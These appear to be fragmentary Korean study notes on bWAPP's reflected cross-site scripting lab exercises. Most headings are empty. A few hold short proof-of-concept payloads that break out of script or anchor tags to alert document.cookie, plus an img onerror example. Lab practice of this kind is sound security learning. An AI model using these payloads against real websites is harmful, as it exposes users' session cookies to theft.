# A3 Cross Site Scripting

## Reflected (GET)

* 반사형

medium

high

## Reflected (POST)

***

## Reflected (JSON)

반응은 하지만 값을 출력하지는 않다.

이전의 스크립트는 종료하고 새로운 스크립트를 추가

```
</script><script>alert(document.cookie)</script>
```

적용된다.

{% stepper %}
{% step %}
### medium

예제 입력:

```html
<img src=x onerror=alret('hello')>
```
{% endstep %}
{% endstepper %}

## Reflected (Back Button)

<br>

예제 헤더:

```
Referer: http://192.168.56.122/bWAPP/xss_back_button.php
```

* 뒤로가기로 넘어가는 사이트

## Reflected (Custom Header)

\
<br>

## Reflected (Eval)

\
\
&#x20;

## Reflected (HREF)

\
\
<br>

* 원하는 동작은 아니지만 비정상적으로 움직임다.

입력을 다음과 같이 수정하면 원하는 결과가 나올 것 같다:

```
</a><script>alert(document.cookie)</script><a>
```

정답

## Reflected (Login Form)

***

## phpMyAdmin BBCode Tag XSS

***

## Reflected ([PHP\_SELF](/broken/pages/bde6faa1a9b94eb56d34975ca8ddc448fa938793))
